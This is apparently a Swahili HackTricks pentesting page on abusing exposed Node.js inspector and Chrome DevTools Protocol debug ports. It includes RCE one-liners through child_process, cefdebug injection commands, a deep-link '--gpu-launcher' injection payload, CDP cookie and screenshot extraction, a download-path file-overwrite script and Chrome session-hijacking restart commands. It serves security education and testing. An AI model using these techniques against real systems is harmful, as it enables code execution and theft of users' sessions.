# Matumizi mabaya ya debug ya Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Mifano ya kihistoria ya vitendo inajumuisha maelezo ya Multimaster na shambulio la debugger la CVE-2019-1414 Visual Studio Code; itumie kama muktadha unaohusu matoleo mahususi badala ya kudhani kuwa kila lengwa la sasa la Electron au Chromium lina primitives zilezile.<sup>[[1]](#references)[[3]](#references)</sup>

## Taarifa za Msingi

[Kutoka kwenye nyaraka](https://nodejs.org/learn/getting-started/debugging): Inapoanzishwa kwa kutumia swichi ya `--inspect`, mchakato wa Node.js husikiliza mteja wa debugging. Kwa **chaguomsingi**, utasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila mchakato pia hupewa **UUID** ya **kipekee**.<sup>[[4]](#references)</sup>

Wateja wa Inspector lazima wajue na kubainisha anwani ya host, port na UUID ili kuunganisha. URL kamili inaweza kufanana na `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina ufikiaji kamili wa mazingira ya utekelezaji ya Node.js**, mhusika hasidi anayeweza kuunganisha kwenye port hii anaweza kutekeleza code yoyote kwa niaba ya mchakato wa Node.js (**uwezekano wa kupandisha mapendeleo**).<sup>[[4]](#references)</sup>

Kuna njia kadhaa za kuanzisha Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Unapoanzisha mchakato unaochunguzwa, kitu kama hiki kitaonekana:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Michakato inayotegemea **CEF** (**Chromium Embedded Framework**) inaweza kufichua debugger kwa kutumia `--remote-debugging-port=9222`. Hii hufichua kivinjari kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) badala ya Node.js inspector, kwa hiyo payload zinazotegemea Node.js `process` hazitumiki moja kwa moja kwa chaguomsingi.<sup>[[2]](#references)[[5]](#references)</sup>

Unapoanzisha kivinjari kilicho katika hali ya debug, kitu kama hiki kitaonekana:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Kuhesabu na kuendesha endpoint ya CDP

Endpoint za HTTP discovery hutofautisha WebSocket ya **browser** na WebSocket za **target** za kibinafsi (tab, worker, extension, n.k.). Tuma ombi kwa `/json/version` ili kupata endpoint ya browser na `/json/list` ili kupata targets; kisha thamani za `webSocketDebuggerUrl` zilizorejeshwa zinaweza kuendeshwa moja kwa moja kwa kutumia ujumbe wa aina ya JSON-RPC wa CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Kwa mfano, unganisha kwa kutumia `websocat "$BROWSER_WS"` na utume `{"id":1,"method":"Target.getTargets"}` au `{"id":2,"method":"Storage.getCookies"}`. Kwenye target ya ukurasa (`websocat "$PAGE_WS"`), `Runtime.evaluate` hutekeleza msimbo kwenye renderer hiyo na `Page.captureScreenshot` hurudisha picha ya skrini iliyosimbwa kwa base64. `document.cookie` haiwezi kufichua cookies za `HttpOnly`, ilhali `Storage.getCookies` huomba browser itoe hifadhi yake ya cookies.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Vivinjari, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zilizofunguliwa kwenye kivinjari zinaweza kutuma maombi ya WebSocket na HTTP chini ya modeli ya usalama ya kivinjari. **Muunganisho wa awali wa HTTP** unahitajika ili **kupata kitambulisho cha kipekee cha kipindi cha debugger**. **same-origin-policy** **huzuia** tovuti kutuma **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kuwa **vichwa vya 'Host'** vya muunganisho vinabainisha **anwani ya IP** au **`localhost`** pekee.<sup>[[4]](#references)</sup>

> [!TIP]
> **Hatua hii ya usalama huzuia kutumia inspector vibaya** ili kutekeleza msimbo kwa **kutuma tu ombi la HTTP** (jambo ambalo lingewezekana kwa kutumia udhaifu wa SSRF).<sup>[[4]](#references)</sup>

### Kuanzisha inspector katika michakato inayoendelea

Unaweza kutuma **signal SIGUSR1** kwa mchakato wa nodejs unaoendelea ili kuufanya **uanze inspector** kwenye port chaguomsingi. Hata hivyo, kumbuka kuwa unahitaji kuwa na ruhusa za kutosha, kwa hiyo hili linaweza kukupa **ufikiaji wenye upendeleo wa taarifa zilizo ndani ya mchakato**, lakini si kupandisha mamlaka moja kwa moja.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Hili ni muhimu kwenye containers kwa sababu **kuzima process na kuanzisha mpya** kwa kutumia `--inspect` **si chaguo**, kwa kuwa **container** **itazimwa** pamoja na process.<sup>[[6]](#references)</sup>

### Unganisha na inspector/debugger

Ili kuunganisha kwenye **browser inayotegemea Chromium**, unaweza kufungua URL ya `chrome://inspect` au `edge://inspect` kwa Chrome au Edge, mtawalia. Unapobofya kitufe cha Configure, hakikisha kwamba **host na port lengwa** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Baada ya hapo, URL ya kufikia debugger itaonekana. Kwa mfano, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha na inspector/debugger: Ili kuunganisha kwenye browser inayotegemea Chromium, ...](<../../images/image (674).png>)

Unaweza kuunganisha na debugger/inspector kwa kutumia **command line**:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Zana ya [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) inaruhusu **kupata inspectors** zinazoendesha ndani ya mfumo wa karibu na **ku-inject code** ndani yao.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Kumbuka kwamba **exploit za NodeJS RCE hazitafanya kazi** ukiwa umeunganishwa na browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE kwenye NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutokana na XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganishwa** na Node **inspector** ni kutumia kitu kama (inaonekana kwamba hii **haitafanya kazi kwenye muunganisho wa Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payload za Chrome DevTools Protocol

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimeona watu wakitumia kutumia vibaya protocol hii.

### Kizuizi cha wasifu chaguomsingi katika Chrome 136+

Kuanzia **Chrome 136**, Chrome hupuuza `--remote-debugging-port` na `--remote-debugging-pipe` zinapotumika kulenga **directory chaguomsingi ya data ya Chrome**. Switch hiyo lazima iambatane na `--user-data-dir` isiyo ya kawaida, ambayo ufunguo wake tofauti wa usimbaji fiche na hali ya kivinjari iliyotengwa huzuia mbinu rahisi inayotegemea flag kufichua wasifu wa kawaida wa mtumiaji ambao tayari umeingia. Kizuizi hiki mahususi cha Chrome hakipaswi kudhaniwa kuwa kinahusu matoleo ya zamani ya Chrome, Chrome for Testing, programu za Electron/CEF au derivatives nyingine za Chromium bila uthibitishaji.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Kwa hiyo, kuona mchakato wa sasa wa Chrome ulioanzishwa kwa `--remote-debugging-port` pekee **hakuthibitishi** kwamba CDP ilianza kufanya kazi. Thibitisha listener na `/json/version`, kisha bainisha ni profile ipi hasa inayoendesha mchakato huo.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security iligundua kwamba programu iliyotegemea CEF ilisajili **URI maalum** kwenye mfumo (workspaces://index.html), iliyopokea URI nzima na kisha **kuanzisha programu inayotegemea CEF** kwa usanidi ambao sehemu yake ilijengwa kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kwamba vigezo vya URI vilifanyiwa URL decoding na kutumiwa kuanzisha programu ya msingi ya CEF, hivyo kumwezesha mtumiaji **kuingiza** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza mambo yoyote.<sup>[[8]](#references)</sup>

Kwa hiyo, payload kama hii:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Itatekeleza calc.exe.<sup>[[8]](#references)</sup>

### Andika Juu ya Faili

Badilisha folda ambamo **faili zilizopakuliwa zitahifadhiwa** kisha pakua faili ili **uandike juu ya** **msimbo chanzo** unaotumiwa mara kwa mara na programu, kwa kutumia **msimbo wako hasidi**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE na exfiltration

STAR Labs ilionyesha kuwa huduma za WebDriver/CDP zilizo wazi zinaweza kuruhusu usomaji wa faili kiholela na RCE; DNS rebinding inaweza kukamilisha mnyororo wa exploit katika baadhi ya usanidi.<sup>[[9]](#references)</sup>

Huduma ya WebDriver ya ChromeDriver ni tofauti na Chrome DevTools/CDP. Capability ya [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) huchagua executable ya browser itakayoanzishwa kwa session mpya. Ikiwa caller asiye na upendeleo anaweza kufikia huduma ya ChromeDriver inayoendeshwa kama root na kutuma session yenye njia ya executable inayodhibitiwa na caller, uanzishaji huo unaweza kuvuka mpaka wa upendeleo wa huduma. Jibu tupu la `/sessions` halithibitishi kuwa session mpya haziwezi kuundwa. Kagua mmiliki wa process, ufikikaji halisi wa listener, uidhinishaji wa session, ufikikaji wa executable na vizuizi vya mazingira kabla ya kuhitimisha kuwa njia hiyo inaweza kutumika; jina la process au port inayotumika kwa kawaida pekee havitoshi. [Mwongozo wa usalama wa Google](https://developer.chrome.com/docs/chromedriver/security-considerations) unasema ChromeDriver iendeshwe chini ya akaunti isiyo na upendeleo. Uchanganuzi tulivu haupaswi kuunda session ya WebDriver.

Kwa mifano mingine ya kihistoria ya browser automation na usalama wa Chromium, tazama maandishi ya Counter WebDriver na masuala ya Project Zero 773, 1742 na 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Kuwasha CDP ndani ya process hai ya Chromium

Kwenye Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ilionyesha kuwa kizuizi cha command-line si njia pekee ya kuwasha CDP: code ambayo tayari inaweza kuingiza code kwenye `msedge.exe` iliyopo inaweza kuita `content::DevToolsAgentHost::StartRemoteDebuggingServer` ya Chromium, ambayo haija-exportiwa, na kufichua profile hai iliyo na uthibitishaji bila kuwasha upya browser.<sup>[[15]](#references)</sup>

Mnyororo ulioonyeshwa huingiza DLL kwa kutumia `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, hutafuta alama za ndani za Edge (kwanza kutoka PDBs na kisha kwa kutumia byte signatures maalum kwa kila toleo), hubadilisha window procedure ya browser, na kutuma ujumbe ili wito wa mwisho wa kuwasha server utekelezwe kwenye browser **UI thread**. Socket hufungwa kwenye loopback, kisha primitives za kawaida za CDP zinaweza kupata cookies, kunasa tabs, kukagua trafiki ya mtandao au kutekeleza JavaScript kwenye kurasa zilizo na uthibitishaji.<sup>[[15]](#references)</sup>

> [!WARNING]
> Hii ni mbinu ya **post-compromise/process-injection**, si bypass ya mtandao isiyohitaji uthibitishaji. Inategemea sana build kwa sababu alama husika za C++ hazija-exportiwa na signatures zinaweza kubadilika baada ya masasisho ya browser.<sup>[[15]](#references)</sup>

Kwa ajili ya detection, usitegemee telemetry ya command-line ya `--remote-debugging-*` pekee: pia linganisha handles na shughuli za kumbukumbu zisizo za kawaida dhidi ya processes za browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, uundaji wa thread), DLL injection na sockets za loopback zisizotarajiwa zinazomilikiwa na Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Katika mazingira halisi na **baada ya kucompromise** PC ya mtumiaji inayotumia browser inayotegemea Chromium, mbinu ya kihistoria ilikuwa kuwasha upya browser ikiwa debugging imewashwa na ku-forward port ya loopback. Hii inaweza kufichua hali ya kuvinjari ya mwathiriwa kwenye bidhaa/builds ambazo bado zinakubali profile iliyochaguliwa, lakini Chrome 136+ haitakubali hili linapolenga saraka yake ya kawaida ya data.<sup>[[7]](#references)[[14]](#references)</sup>

Amri ya awali ya kuwasha upya imehifadhiwa hapa chini kwa targets za zamani/maalum kwa toleo. Amri ya pili ndiyo njia inayoungwa mkono katika Chrome ya sasa, lakini huunda profile iliyotengwa badala ya kufungua tena hali ya kawaida ya mwathiriwa yenye uthibitishaji.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Kwa mbinu za Chromium za macOS zinazohusu kuwasha upya, viendelezi na CDP, angalia [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Zana ya kukagua na kutumia vibaya debugger ya CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Utekelezaji wa Msimbo wa Mbali katika Visual Studio Code kupitia Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Mwongozo wa Debugging wa Node.js - Kuanza](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Kutumia Vibaya Kipengele cha Debugging cha Chrome ili Kuangalia na Kudhibiti Vipindi vya Kuvinjari kwa Mbali](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Utekelezaji wa Msimbo wa Mbali katika AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Unaongea Nami? - RCE ya WebDriver kupitia DNS Rebinding na CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Kutoka Bot hadi RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Mabadiliko ya swichi za remote debugging ili kuboresha usalama - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Kuingiza CDP kwenye Kivinjari cha Edge Kinachoendelea Kufanya Kazi: Uchunguzi wa Kina wa Uwekaji Vyombo katika Runtime ya Kivinjari](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
